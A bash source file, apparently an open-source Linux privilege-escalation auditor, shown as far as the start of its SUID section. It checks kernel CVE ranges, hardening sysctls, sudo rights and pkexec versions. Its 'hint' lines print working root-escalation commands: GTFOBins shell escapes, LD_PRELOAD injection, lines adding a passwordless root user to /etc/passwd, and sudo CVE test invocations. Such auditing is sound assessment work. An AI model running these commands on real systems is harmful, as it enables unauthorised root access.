#!/usr/bin/env bash
# shellcheck shell=bash disable=SC2086,SC2016,SC2129,SC1090,SC2012
# =============================================================================
#  linux_local_privesc.sh   v1.0.0
#  Local privilege-escalation auditor for Linux -- LinPEAS-class coverage.
#
#  300+ read-only checks across:
#    [01] system & kernel        [07] writable files & dirs
#    [02] sudo                   [08] credentials & secrets
#    [03] SUID / SGID            [09] network & services
#    [04] capabilities           [10] containers
#    [05] cron, timers, units    [11] installed software / CVEs
#    [06] PATH, env, groups      [12] hardening gaps & misc
#
#  READ-ONLY. This script does not modify the host, except that
#  --probe-metadata issues a single HTTP GET to the cloud metadata endpoint.
#
#  For authorised lab, CTF and assessment use only. Use on systems you own or
#  have written permission to test. Everything else is a crime.
#
#  Usage:
#    ./linux_local_privesc.sh                 standard scan
#    ./linux_local_privesc.sh --quick         skip full-filesystem find(1) sweeps
#    ./linux_local_privesc.sh --full          cross filesystem boundaries
#    ./linux_local_privesc.sh --no-net        no network probes at all
#    ./linux_local_privesc.sh --probe-metadata  GET the metadata endpoint (IMDS)
#    ./linux_local_privesc.sh --json          also write findings.json
#    ./linux_local_privesc.sh -o DIR          output directory
#    ./linux_local_privesc.sh --selftest      validate helpers, scan nothing
#    ./linux_local_privesc.sh -h|--help
# =============================================================================

VERSION="1.0.0"
START_EPOCH=$(date +%s)
MODE="normal"          # normal | quick | full
DO_NET=1
DO_JSON=0
DO_META=0
TIMEOUT=25
OUTDIR=""

# ------------------------------------------------------------------ colours
RST=""
if [ -t 1 ] && [ -z "${NO_COLOR:-}" ] && [ "${TERM:-dumb}" != "dumb" ]; then
    RED=$'\033[1;31m'; GRN=$'\033[1;32m'; YEL=$'\033[1;33m'
    BLU=$'\033[1;36m'; MAG=$'\033[1;35m'; CYN=$'\033[0;36m'
    DIM=$'\033[2m';    BLD=$'\033[1m';    RST=$'\033[0m'
else
    RED=""; GRN=""; YEL=""; BLU=""; MAG=""; CYN=""; DIM=""; BLD=""
fi

usage() { sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'; exit 0; }

while [ $# -gt 0 ]; do
    case "$1" in
        --quick)     MODE="quick" ;;
        --full)      MODE="full" ;;
        --no-net)    DO_NET=0 ;;
        --probe-metadata) DO_META=1 ;;
        --json)      DO_JSON=1 ;;
        -o|--output) shift; OUTDIR="${1:-}" ;;
        --selftest)  SELFTEST=1 ;;
        -h|--help)   usage ;;
        *) printf 'unknown option: %s (try --help)\n' "$1" >&2; exit 2 ;;
    esac
    shift
done

if [ -z "$OUTDIR" ] && [ "${SELFTEST:-0}" = "1" ]; then
    # a selftest writes nothing worth keeping: never litter the user's cwd
    OUTDIR="${TMPDIR:-/tmp}/linux_local_privesc-selftest-$$"
elif [ -z "$OUTDIR" ]; then
    OUTDIR="$PWD/linux_local_privesc-$(date +%Y%m%d-%H%M%S)"
fi
if ! mkdir -p "$OUTDIR" 2>/dev/null; then
    OUTDIR="/tmp/linux_local_privesc-$$"
    mkdir -p "$OUTDIR" 2>/dev/null
fi
LOG="$OUTDIR/report.txt"
: > "$LOG" 2>/dev/null || { printf 'cannot write %s\n' "$LOG" >&2; exit 1; }

# ------------------------------------------------------------------ helpers
CHECKS=0; N_CRIT=0; N_WARN=0; N_INFO=0; N_OK=0
SEC_NO=0
SEC="INIT"
# counters live in files, not variables: most checks run inside pipelines and
# $(...) which are subshells, so variable increments would be lost.
CHK_FILE="$OUTDIR/.checks"; FIND_FILE="$OUTDIR/.findings"
: > "$CHK_FILE" 2>/dev/null
: > "$FIND_FILE" 2>/dev/null
FINDINGS=""

ME=$(id -un 2>/dev/null || echo unknown)
MYUID=$(id -u 2>/dev/null || echo 65534)
ASROOT=0; [ "$MYUID" = "0" ] && ASROOT=1

have() { command -v "$1" >/dev/null 2>&1; }
if have timeout; then
    run() { timeout "$TIMEOUT" "$@" 2>/dev/null; }
    run2() { timeout 4 "$@" 2>/dev/null; }
else
    run() { "$@" 2>/dev/null; }
    run2() { "$@" 2>/dev/null; }
fi

emit() { # $1 plain (goes to log verbatim), $2 optional colour
    printf '%s\n' "$1" >> "$LOG"
    if [ -n "${2:-}" ]; then printf '%s%s%s\n' "$2" "$1" "$RST"
    else printf '%s\n' "$1"; fi
}

sec() {
    SEC_NO=$((SEC_NO + 1)); SEC="$*"
    local el=$(( SECONDS - START_EPOCH ))
    emit "" ""
    emit "======================================================================" "$BLU"
    emit " [$(printf '%02d' "$SEC_NO")] $*   (+${el}s)" "$BLU$BLD"
    emit "======================================================================" "$BLU"
}

sub() { emit "" ""; emit " -- $*" "$MAG"; }

_san() { printf '%s' "$*" | tr '\n\r\t' '   ' | tr -s ' ' | cut -c1-400; }
ck()   { printf '.\n' >> "$CHK_FILE"; }
ok()   { ck; emit "  [ ok ] $(_san "$*")" "$GRN"; }
info() { ck; emit "  [ .. ] $(_san "$*")" "$DIM"; }
warn() { ck; local m; m=$(_san "$*"); emit "  [WARN] $m" "$YEL"; printf 'WARN|%s|%s\n' "$SEC" "$m" >> "$FIND_FILE"; }
crit() { ck; local m; m=$(_san "$*"); emit "  [CRIT] $m" "$RED$BLD"; printf 'CRIT|%s|%s\n' "$SEC" "$m" >> "$FIND_FILE"; }
rec_totals() {
    CHECKS=$(wc -l < "$CHK_FILE" 2>/dev/null | tr -d ' '); CHECKS=${CHECKS:-0}
    N_CRIT=$(grep -c '^CRIT|' "$FIND_FILE" 2>/dev/null); N_CRIT=${N_CRIT:-0}
    N_WARN=$(grep -c '^WARN|' "$FIND_FILE" 2>/dev/null); N_WARN=${N_WARN:-0}
    N_OK=$(grep -c '^  \[ ok \]' "$LOG" 2>/dev/null); N_OK=${N_OK:-0}
    N_INFO=$(grep -c '^  \[ \.\. \]' "$LOG" 2>/dev/null); N_INFO=${N_INFO:-0}
}
hint() { emit "         -> $(_san "$*")" "$CYN"; }
raw()  { emit "$*" ""; }

# version compare, underscore-split numeric aware, uses sort -V
ver_lt() { # $1 < $2 ?
    local a="${1#v}" b="${2#v}"
    [ "$a" = "$b" ] && return 1
    [ "$(printf '%s\n%s\n' "$a" "$b" | sort -V 2>/dev/null | head -n1)" = "$a" ]
}
ver_ge() { ver_lt "$1" "$2" && return 1; return 0; }

# is $1 more permissive than octal $2 ?  (any extra bit set = too open)
perm_open() {
    local p="$1" allow="$2" cur ac aa
    cur=$(stat -c '%a' "$p" 2>/dev/null) || return 2
    cur=${cur: -3}; ac=$((8#$cur)); aa=$((8#$allow))
    [ $(( ac & ~aa )) -ne 0 ]
}

ww()   { [ -n "$(find "$1" -maxdepth 0 -perm -0002 2>/dev/null)" ]; }   # world-writable
wgrp() { [ -n "$(find "$1" -maxdepth 0 -perm -0020 2>/dev/null)" ]; }   # group-writable

# first line that matches, trimmed
grepq() { run grep -m1 -E "$1" "$2" 2>/dev/null | head -n1; }

binfo() { # path -> "perms owner:group size"
    stat -c '%a %U:%G %s %n' "$1" 2>/dev/null
}

banner() {
    emit "" ""
    emit "  linux_local_privesc.sh  v$VERSION        $(date '+%Y-%m-%d %H:%M:%S %Z')" "$BLD"
    emit "  user=$ME uid=$MYUID  mode=$MODE  net=$DO_NET  root=$ASROOT" "$DIM"
    emit "  report: $LOG" "$DIM"
    if [ "$ASROOT" = "1" ]; then
        emit "  WARNING: running as root. Findings reflect root's view and will" "$YEL"
        emit "           over-report writability. Re-run as the low-priv user." "$YEL"
    fi
}

# =============================================================================
if [ "${SELFTEST:-0}" = "1" ]; then
    banner
    SF=0
    t() { if eval "$2"; then echo "  [ ok ] $1"; else echo "  [FAIL] $1"; SF=$((SF+1)); fi; }
    echo "selftest: helper contract"
    t "ver_lt 1.8.27 < 1.8.28"        'ver_lt 1.8.27 1.8.28'
    t "ver_lt 4.8.3 not < 4.8.30"     '! ver_lt 4.8.30 4.8.3'
    t "ver_ge equal"                  'ver_ge 1.9.5 1.9.5'
    t "ver_lt numeric (5.15 vs 5.9)"  '! ver_lt 5.15 5.9'
    t "perm_open 644 > 600"           'perm_open /etc/passwd 600'
    t "perm_open 644 not > 664"       '! perm_open /etc/passwd 664'
    t "perm_open missing file -> 2"   'perm_open /nonexistent 600; [ $? -eq 2 ]'
    t "kb parse"                      '[ -n "$(uname -r | grep -oE "^[0-9]+\.[0-9]+(\.[0-9]+)?")" ]'
    t "emit+log writable"             'emit "selftest line" "" && grep -q "selftest line" "$LOG"'
    t "counters file-based"           'printf ".\n" >> "$CHK_FILE" && [ "$(wc -l < "$CHK_FILE")" -ge 1 ]'
    t "crit lands in FIND_FILE"       'crit "selftest crit" && grep -q "^CRIT|" "$FIND_FILE"'
    echo ""
    rec_totals
    echo "selftest: $SF failures, $CHECKS check-events, $N_CRIT crit, $N_WARN warn in log"
    printf 'log written to %s\n' "$LOG"
    [ "$SF" = "0" ] && exit 0 || exit 1
fi

# =============================================================================
banner

# ---------------------------------------------------------------------------
sec "SYSTEM, DISTRO, KERNEL"
# ---------------------------------------------------------------------------

sub "identity"
info "user: $ME (uid=$MYUID gid=$(id -g) groups=$(id -Gn 2>/dev/null | tr ' ' ','))"
info "host: $(hostname 2>/dev/null)  kernel: $(uname -r)"
info "arch: $(uname -m)  nproc: $(nproc 2>/dev/null)  uptime: $(uptime -p 2>/dev/null || uptime 2>/dev/null)"
info "date: $(date)  tz: $(date +%Z)"

if [ -r /etc/os-release ]; then
    # shellcheck disable=SC1091
    . /etc/os-release 2>/dev/null
    info "distro: ${PRETTY_NAME:-$NAME $VERSION}"
    DISTRO_ID="${ID:-unknown}"; DISTRO_VER="${VERSION_ID:-0}"
    info "id=$DISTRO_ID version=$DISTRO_VER"
else
    DISTRO_ID=unknown; DISTRO_VER=0
    info "distro: /etc/os-release unreadable"
fi

sub "kernel version and build"
KBASE=$(uname -r | grep -oE '^[0-9]+\.[0-9]+(\.[0-9]+)?' || echo 0.0.0)
KBUILD=$(cat /proc/version 2>/dev/null)
info "kernel base: $KBASE"
info "build: ${KBUILD:-unreadable}"
if [ -r /proc/cmdline ]; then
    info "cmdline: $(cat /proc/cmdline)"
    case "$(cat /proc/cmdline)" in
        *nokaslr*) warn "kernel booted with nokaslr -> KASLR disabled, kernel exploits far more reliable" ;;
        *slub_debug*) info "slub_debug enabled on cmdline (hardening/debug build)" ;;
        *nopti*|*pti=off*) warn "PTI disabled on cmdline -> KPTI bypass attacks easier" ;;
        *nosmap*|*nosmep*) warn "SMEP/SMAP disabled on cmdline" ;;
    esac
fi

sub "known kernel privilege-escalation CVEs"

# cve_or <cve> <desc> <min> <max> [<min> <max> ...]
cve_or() {
    local cve="$1" desc="$2"; shift 2
    local hit=0 a b
    while [ $# -ge 2 ]; do
        a="$1"; b="$2"; shift 2
        if ver_ge "$KBASE" "$a" && ver_lt "$KBASE" "$b"; then hit=1; fi
    done
    if [ "$hit" = "1" ]; then
        crit "$cve candidate: $KBASE in vulnerable range -- $desc"
        RETURN_CVE=1
    else
        ok "$cve not applicable to $KBASE"
        RETURN_CVE=0
    fi
}

declare -a CVE_HITS=()
report_cve() { cve_or "$@"; [ "$RETURN_CVE" = "1" ] && CVE_HITS+=("$1"); }

report_cve CVE-2024-1086 "nf_tables use-after-free, universal root (kos)" 5.14 6.6.15 6.1 6.1.76
report_cve CVE-2023-32233 "nf_tables anonymous set UAF -> root" 5.14 6.3.2
report_cve CVE-2023-0386 "overlayfs copy_up privilege confusion" 5.11 6.2
report_cve CVE-2022-25636 "nf_dup_netdev out-of-bounds write" 5.4 5.16.12
report_cve CVE-2022-1015 "nftables stack OOB in nft_do_chain" 5.12 5.17
report_cve CVE-2022-0847 "Dirty Pipe, overwrite read-only files" 5.8 5.16.11 5.15 5.15.25 5.10 5.10.102
report_cve CVE-2022-0492 "cgroup release_agent escape (containers)" 3.0 5.16.2
report_cve CVE-2022-0185 "legacy_parse_param heap overflow in fs_context" 5.1 5.16.2
report_cve CVE-2021-22555 "netfilter x_tables heap OOB write" 2.6.19 5.12.4
report_cve CVE-2021-3493 "Ubuntu overlayfs caps not honoured" 4.4 5.11
report_cve CVE-2021-27365 "iSCSI heap overflow (needs module)" 2.6 5.11.4
report_cve CVE-2020-14386 "AF_PACKET tpacket_rcv overflow" 4.6 5.8.9
report_cve CVE-2019-18683 "v4l2 vivid race" 4.4 5.3.11
report_cve CVE-2017-16995 "eBPF verifier ALU32 (needs unprivileged bpf)" 4.4 4.14.8
report_cve CVE-2017-6074 "DCCP double-free" 2.6 4.9.11
report_cve CVE-2017-1000112 "UDP fragmentation offload OOB" 4.4 4.13.5
report_cve CVE-2016-5195 "Dirty COW" 2.6.22 4.8.3
report_cve CVE-2016-0728 "keyring refcount overflow" 3.8 4.4.1
report_cve CVE-2015-1328 "overlayfs privilege escalation" 3.13 4.0
report_cve CVE-2014-3153 "futex requeue pi (Towelroot)" 2.6.0 3.14.5
report_cve CVE-2010-3904 "RDS protocol privileged ops" 2.6.0 2.6.36

if [ "${#CVE_HITS[@]}" -gt 0 ]; then
    sub "kernel CVE summary"
    for c in "${CVE_HITS[@]}"; do
        warn "verify patch level for $c against $DISTRO_ID $DISTRO_VER -- distro backports often make ranges misleading"
    done
    hint "confirm with: uname -r; then match against your distro's security tracker"
    hint "unprivileged exploitability also depends on the sysctls printed below"
fi

sub "kernel hardening sysctls (attack surface)"
sysctl_chk() { # key expected desc
    local k="$1" want="$2" d="$3" v
    v=$(cat "/proc/sys/$k" 2>/dev/null | tr -d '\n' | tr '\t' ' ')
    if [ -z "$v" ]; then info "$k: not present"; return; fi
    if [ "$v" = "$want" ]; then ok "$k = $v ($d)"
    else warn "$k = $v, expected $want -- $d"; fi
}
sysctl_chk kernel.kptr_restrict 1 "hides kernel pointers from %pK"
sysctl_chk kernel.dmesg_restrict 1 "blocks unprivileged dmesg (leaks addresses)"
sysctl_chk kernel.perf_event_paranoid 3 "restricts perf events"
sysctl_chk kernel.unprivileged_bpf_disabled 1 "blocks unprivileged BPF (huge class of kernel bugs)"
sysctl_chk kernel.yama.ptrace_scope 1 "restricts ptrace of other processes"
sysctl_chk fs.suid_dumpable 0 "no core dumps of suid binaries"
sysctl_chk fs.protected_symlinks 1 "blocks symlink races in sticky dirs"
sysctl_chk fs.protected_hardlinks 1 "blocks hardlink attacks on suid"
sysctl_chk fs.protected_fifos 2 "blocks FIFO races"
sysctl_chk fs.protected_regular 2 "blocks regular-file races in sticky dirs"
sysctl_chk net.ipv4.ip_forward 0 "not a router"
sysctl_chk kernel.randomize_va_space 2 "full ASLR"

for k in kernel.unprivileged_userns_clone user.max_user_namespaces kernel.unprivileged_bpf_disabled; do
    v=$(cat "/proc/sys/$k" 2>/dev/null)
    [ -n "$v" ] || continue
    case "$k:$v" in
        kernel.unprivileged_userns_clone:1|user.max_user_namespaces:0)
            [ "$v" = "0" ] && ok "$k=0 user namespaces disabled" || warn "$k=1 unprivileged user namespaces ALLOWED -- enables most kernel LPEs and container escapes" ;;
        kernel.unprivileged_bpf_disabled:0) warn "$k=0 unprivileged BPF allowed" ;;
        *) info "$k=$v" ;;
    esac
done

sub "ASLR / NX / SMEP / SMAP"
[ "$(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)" = "2" ] && ok "ASLR full" || warn "ASLR not full"
if [ -r /proc/cpuinfo ]; then
    grep -qw nx /proc/cpuinfo && ok "CPU reports NX" || warn "no NX flag -- writable/executable stack"
    grep -qw smep /proc/cpuinfo && info "SMEP present" || info "SMEP absent"
    grep -qw smap /proc/cpuinfo && info "SMAP present" || info "SMAP absent"
    ck
fi
info "CAS: $(cat /proc/sys/kernel/random/boot_id 2>/dev/null | head -c 8)... boot_id exposed (normal)"

sub "readable kernel/process data"
[ -r /proc/kallsyms ] && { if grep -q ' [tT] ' /proc/kallsyms 2>/dev/null; then crit "/proc/kallsyms readable with symbol addresses -> KASLR bypass"; else ok "/proc/kallsyms readable but addresses zeroed"; fi; } || ok "/proc/kallsyms not readable"
[ -r /proc/kcore ] && { ck; if [ -r /proc/kcore ] && [ "$ASROOT" = "0" ]; then crit "/proc/kcore readable as non-root (kernel memory)"; else ok "/proc/kcore root-only"; fi; }
[ -r /proc/1/environ ] && ok "/proc/1/environ readable (same uid or root)" || info "/proc/1/environ not readable"
if [ -r /proc/sys/kernel/core_pattern ]; then
    cp_val=$(cat /proc/sys/kernel/core_pattern 2>/dev/null)
    info "core_pattern: $cp_val"
    case "$cp_val" in
        \|*) crit "core_pattern starts with a pipe -> root runs that program on any crash (container escape / privesc if writable)" ;;
    esac
fi

sub "boot, grub, module loading"
if [ -r /boot/grub/grub.cfg ]; then
    perm_open /boot/grub/grub.cfg 600 && warn "/boot/grub/grub.cfg is group/other readable" || ok "/boot/grub/grub.cfg restricted"
fi
for f in /boot/grub/grub.cfg /etc/grub.d /boot/grub2/grub.cfg /etc/default/grub; do
    [ -e "$f" ] || continue
    if [ -w "$f" ]; then crit "$f writable by $ME -> boot into single-user / init=/bin/sh"; fi
done
[ -z "$(grep -l '^set superusers' /boot/grub*/grub.cfg 2>/dev/null)" ] && info "no GRUB superuser password configured (physical/console access = root)" || ok "GRUB password set"
if [ -d /etc/modprobe.d ]; then
    for f in /etc/modprobe.d/*.conf; do
        [ -e "$f" ] || continue
        [ -w "$f" ] && crit "$f writable -> blacklist/alias modules, block security tooling"
    done
    ck; ok "modprobe.d checked"
fi
[ -w /etc/modules ] && crit "/etc/modules writable -> load arbitrary module at boot"
if have lsmod; then
    n=$(run lsmod | wc -l)
    ck; info "loaded modules: $((n>0 ? n-1 : 0))"
    run lsmod | awk 'NR>1{print $1}' | grep -qE '^(dccp|sctp|rds|vivid|n_hdlc|can_bcm)$' && warn "known-exploitable legacy module loaded" || ok "no classic vulnerable module names in lsmod"
fi

sub "hardening frameworks"
if have getenforce; then
    e=$(run getenforce); [ "$e" = "Enforcing" ] && ok "SELinux enforcing" || warn "SELinux $e"
elif [ -d /sys/fs/selinux ]; then
    e=$(cat /sys/fs/selinux/enforce 2>/dev/null)
    [ "$e" = "1" ] && ok "SELinux enforcing" || warn "SELinux permissive/disabled"
else
    info "SELinux not mounted"
fi
if [ -d /sys/module/apparmor ]; then
    n=$(run aa-status --enabled >/dev/null 2>&1 && echo on || echo off)
    ck; [ "$n" = "on" ] && ok "AppArmor enabled" || warn "AppArmor present but not enforcing"
    run aa-status 2>/dev/null | grep -E 'processes are unconfined|profiles are in complain' | head -2 | while read -r l; do [ -n "$l" ] && warn "apparmor: $l"; done
else
    info "AppArmor not present"
fi
if have systemctl; then
    for u in auditd rsyslog apparmor; do
        st=$(run systemctl is-active "$u" 2>/dev/null)
        [ "$st" = "active" ] && ok "$u active" || info "$u: ${st:-unknown}"
    done
fi

sub "umask and password policy"
info "current umask: $(umask)"
if [ -r /etc/login.defs ]; then
    u=$(grep -E '^\s*UMASK' /etc/login.defs 2>/dev/null | awk '{print $2}')
    case "$u" in
        077|027) ok "login.defs UMASK=$u" ;;
        "") info "no UMASK in login.defs (distro default 022)" ;;
        *) warn "login.defs UMASK=$u is permissive" ;;
    esac
    info "PASS_MAX_DAYS=$(grep -E '^\s*PASS_MAX_DAYS' /etc/login.defs 2>/dev/null | awk '{print $2}')"
    info "ENCRYPT_METHOD=$(grep -E '^\s*ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')"
fi

# ---------------------------------------------------------------------------
sec "SUDO"
# ---------------------------------------------------------------------------

SUDO_BIN=$(command -v sudo 2>/dev/null)
if [ -z "$SUDO_BIN" ]; then
    info "sudo not installed -- checking doas/su instead"
else
    SV=$(run sudo -V 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z0-9]*' | head -n1)
    info "sudo version: ${SV:-unknown}"
    if [ -n "$SV" ]; then
        if ver_lt "$SV" "1.9.5p2"; then
            crit "CVE-2021-3156 (Baron Samedit): sudo $SV < 1.9.5p2 -> local root via sudoedit -s buffer overflow"
            hint "test: sudoedit -s '\' \$(python3 -c 'print(\"A\"*65536)')"
        else
            ok "not vulnerable to CVE-2021-3156"
        fi
        if ver_lt "$SV" "1.8.28"; then
            crit "CVE-2019-14287: sudo < 1.8.28 -> 'sudo -u#-1 id' bypasses a (ALL,!root) rule"
            hint "test: sudo -u#-1 /bin/bash"
        else
            ok "not vulnerable to CVE-2019-14287"
        fi
        if ver_lt "$SV" "1.9.12p2"; then
            warn "CVE-2023-22809: sudo < 1.9.12p2 -> sudoedit EDITOR bypass adds files to allow-list"
        else
            ok "not vulnerable to CVE-2023-22809"
        fi
        if ver_lt "$SV" "1.9.17p1"; then
            info "sudo below 1.9.17p1 -- several lesser CVEs fixed since; check distro backports"
        else
            ok "sudo modern (>=1.9.17p1)"
        fi
    fi

    sub "sudo rights for $ME"
    SL=$(run sudo -n -l 2>&1)
    printf '%s\n' "$SL" >> "$LOG"
    if printf '%s' "$SL" | grep -qi 'may run the following'; then
        printf '%s\n' "$SL" | grep -E '^\s+\(|NOPASSWD|SETENV|env_keep|!.*' | head -40 | while IFS= read -r l; do
            [ -n "$l" ] && { warn "sudo rule: $(printf '%s' "$l" | sed 's/^ *//')"; }
        done
    elif printf '%s' "$SL" | grep -qi 'not allowed'; then
        ok "no sudo rights for $ME"
    elif printf '%s' "$SL" | grep -qi 'password is required'; then
        warn "sudo rights exist but need a password -- try 'sudo -l' interactively"
    else
        info "sudo -l output: $(printf '%s' "$SL" | head -n2 | tr '\n' ' ')"
    fi

    sub "sudo rule analysis"
    if printf '%s' "$SL" | grep -q 'NOPASSWD'; then
        crit "NOPASSWD entry found -> no credential needed to escalate"
        printf '%s' "$SL" | grep NOPASSWD | while IFS= read -r l; do hint "rule: $l"; done
    else
        ok "no NOPASSWD entries visible"
    fi

    if printf '%s' "$SL" | grep -qE 'env_keep.*(LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH|PERL5LIB|BASH_ENV|IFS)'; then
        crit "sudoers env_keep preserves a hijackable variable -> LD_PRELOAD / library hijack to root"
        hint "inject: echo 'void _init(){setuid(0);system(\"/bin/sh\");}' > /tmp/x.c; gcc -fPIC -shared -o /tmp/x.so /tmp/x.c; sudo LD_PRELOAD=/tmp/x.so <allowed-cmd>"
    else
        ok "no dangerous env_keep (LD_PRELOAD/LD_LIBRARY_PATH/PYTHONPATH/BASH_ENV)"
    fi

    if printf '%s' "$SL" | grep -qE 'SETENV'; then
        warn "SETENV granted -> the rule lets you set env vars, combine with LD_PRELOAD"
    fi

    # GTFOBins match on the allowed binaries
    sub "GTFOBins match for allowed binaries"
    ALLOWED=$(printf '%s' "$SL" | grep -oE '(/[A-Za-z0-9._+-]+)+' | grep -vE '^/dev|^/proc' | sort -u)
    if [ -z "$ALLOWED" ]; then
        info "no absolute command paths parsed out of sudo -l"
    else
        for p in $ALLOWED; do
            b=$(basename "$p")
            case "$b" in
                vim|vi|nvim|view)        crit "sudo $b -> ':!sh' gives a root shell"; hint "sudo $b -c ':!sh'" ;;
                less|more|man)           crit "sudo $b -> '!sh' inside the pager"; hint "sudo $b /etc/hostname then type: !sh" ;;
                find)                    crit "sudo find -> -exec sh"; hint "sudo find /etc -name x -exec /bin/sh -p \\; -quit" ;;
                awk|gawk|mawk|nawk)      crit "sudo awk -> BEGIN block spawns shell"; hint "sudo awk 'BEGIN{system(\"/bin/sh\")}'" ;;
                bash|sh|dash|zsh|ksh|csh|fish|rbash) crit "sudo $b -> direct root shell"; hint "sudo $b -p (for -p preserve euid on sh)" ;;
                python|python3|python2|pypy) crit "sudo $b -> os.system shell"; hint "sudo $b -c 'import os;os.system(\"/bin/sh\")'" ;;
                perl)                    crit "sudo perl -> exec"; hint "sudo perl -e 'exec \"/bin/sh\"'" ;;
                ruby)                    crit "sudo ruby -> exec"; hint "sudo ruby -e 'exec \"/bin/sh\"'" ;;
                node|nodejs)             crit "sudo node -> child_process"; hint "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'" ;;
                php)                     crit "sudo php -> system()"; hint "sudo php -r 'system(\"/bin/sh\");'" ;;
                lua)                     crit "sudo lua -> os.execute"; hint "sudo lua -e 'os.execute(\"/bin/sh\")'" ;;
                tar)                     crit "sudo tar -> checkpoint action"; hint "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
                zip)                     crit "sudo zip -> -T/-TT exec"; hint "sudo zip /tmp/x.zip /etc/hostname -T -TT 'sh #'" ;;
                gzip|gunzip|zcat)        crit "sudo $b -> --to-stdout abuses, or SHELL/HOME"; hint "sudo gzip -c /etc/shadow | gzip -d" ;;
                rsync|-e)                crit "sudo rsync -> -e shell"; hint "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' /dev/null x:/dev/null" ;;
                env)                     crit "sudo env -> run anything"; hint "sudo env /bin/sh" ;;
                tee)                     crit "sudo tee -> write /etc/passwd"; hint "echo 'pwn::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd" ;;
                cp|mv|install|ln)        crit "sudo $b -> overwrite /etc/passwd, /etc/sudoers, or an suid binary"; hint "sudo cp /bin/bash /tmp/rb; sudo chmod 4755 /tmp/rb" ;;
                chmod|chown)             crit "sudo $b -> grant yourself root-level access"; hint "sudo chmod 4755 /bin/bash" ;;
                dd)                      crit "sudo dd -> overwrite files as root"; hint "echo pwn::0:0::/root:/bin/bash | sudo dd of=/etc/passwd oflag=append conv=notrunc" ;;
                nmap)                    crit "sudo nmap -> --interactive !sh (nmap<2.02) or --script lua"; hint "sudo nmap --script=/tmp/x.nse (os.execute in lua)" ;;
                mount|umount)            crit "sudo $b -> mount over /etc or a suid binary"; hint "sudo mount -o bind /bin/sh /bin/mount" ;;
                systemctl)               crit "sudo systemctl -> run arbitrary unit as root"; hint "sudo systemctl link /tmp/x.service; sudo systemctl start x" ;;
                journalctl)              crit "sudo journalctl -> pager !sh"; hint "sudo journalctl -n1 --no-pager || sudo journalctl then !sh" ;;
                apt|apt-get)             crit "sudo $b -> hooks run as root"; hint "sudo apt-get install -o APT::Update::Pre-Invoke::=/bin/sh x" ;;
                dpkg)                    crit "sudo dpkg -> maintainer script as root"; hint "build a .deb whose postinst is /bin/sh" ;;
                snap)                    crit "sudo snap -> arbitrary command via snap run/install hooks" ;;
                docker)                  crit "sudo docker -> mount host fs as root"; hint "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
                git)                     crit "sudo git -> pager / hooks"; hint "sudo git -p help config  then !sh" ;;
                ssh)                     crit "sudo ssh -> ProxyCommand"; hint "sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x" ;;
                socat)                   crit "sudo socat -> exec"; hint "sudo socat stdin exec:/bin/sh" ;;
                make)                    crit "sudo make -> $(shell) in a makefile you control"; hint "printf 'x:\\n\\tsh\\n' > /tmp/Makefile; sudo make -f /tmp/Makefile" ;;
                gcc|cc|clang|as|ld)      crit "sudo compiler -> compile and run a root setuid binary" ;;
                openssl)                 crit "sudo openssl -> -engine arbitrary .so"; hint "sudo openssl req -engine /tmp/x.so" ;;
                gdb|strace|ltrace)       crit "sudo $b -> run a program under the tracer as root" ;;
                xargs)                   crit "sudo xargs -> run anything"; hint "echo /bin/sh | sudo xargs" ;;
                timeout)                 crit "sudo timeout -> run anything"; hint "sudo timeout 3 /bin/sh" ;;
                watch|nice|ionice|stdbuf|setsid|script|expect|taskset|setpriv) crit "sudo $b -> command wrapper, run /bin/sh" ;;
                nsenter)                 crit "sudo nsenter -> enter host namespaces"; hint "sudo nsenter -t 1 -m -u -i -n -p -- /bin/sh" ;;
                unshare)                 crit "sudo unshare -> new namespace as root" ;;
                chroot)                  crit "sudo chroot -> escape into a root shell" ;;
                *) info "sudo allowed: $p (not in the quick GTFOBins map -- check gtfobins.github.io)" ;;
            esac
        done
    fi
fi

sub "sudoers configuration files"
for f in /etc/sudoers /etc/sudoers.d; do
    [ -e "$f" ] || continue
    if [ "$f" = "/etc/sudoers" ]; then
        perm_open "$f" 440 && crit "/etc/sudoers mode $(stat -c %a "$f") readable by others -> offline rule disclosure" || ok "/etc/sudoers mode ok"
    fi
    [ -w "$f" ] && crit "$f writable by $ME -> prepend '$(whoami) ALL=(ALL) NOPASSWD:ALL'"
done
if [ -d /etc/sudoers.d ]; then
    for f in /etc/sudoers.d/*; do
        [ -e "$f" ] || continue
        [ -w "$f" ] && crit "sudoers.d file writable: $f"
        case "$f" in *'~'|*.bak|*.old|*.dpkg-*|*.rpmnew|*.swp|*.#*) warn "sudoers.d leftover/backup file: $f" ;; esac
    done
    perm_open /etc/sudoers.d 750 && warn "/etc/sudoers.d mode $(stat -c %a /etc/sudoers.d) group/other readable" || ok "/etc/sudoers.d mode ok"
fi
[ -d /etc/sudo.conf ] && [ -w /etc/sudo.conf ] && crit "/etc/sudo.conf writable -> point plugin_dir at your own plugin"

sub "alternative helpers (su/doas/pkexec)"
for b in doas pkexec su; do
    p=$(command -v $b 2>/dev/null) || continue
    [ -u "$p" ] && info "$b at $p is setuid (expected)" || info "$b at $p"
done
if have pkexec; then
    PV=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -n1)
    info "pkexec version: ${PV:-unknown}"
    case "$PV" in
        0.10[0-4]|0.105) crit "CVE-2021-4034 (PwnKit) likely: pkexec $PV -> argc=0 out-of-bounds, local root" ; hint "./PwnKit  (or: pkexec --user root env 2>/dev/null)" ;;
        "") info "cannot parse pkexec version; test manually if <0.105-26 or unpatched Ubuntu/Debian" ;;
        *) ok "pkexec $PV not the classic PwnKit build" ;;
    esac
fi
if [ -r /etc/doas.conf ]; then
    info "doas.conf: $(tr '\n' ';' < /etc/doas.conf | head -c 300)"
    grep -qE 'nopass|keepenv' /etc/doas.conf && warn "doas.conf allows nopass/keepenv -- treat as NOPASSWD sudo"
fi
# ---------------------------------------------------------------------------
sec "SUID / SGID BINARIES"
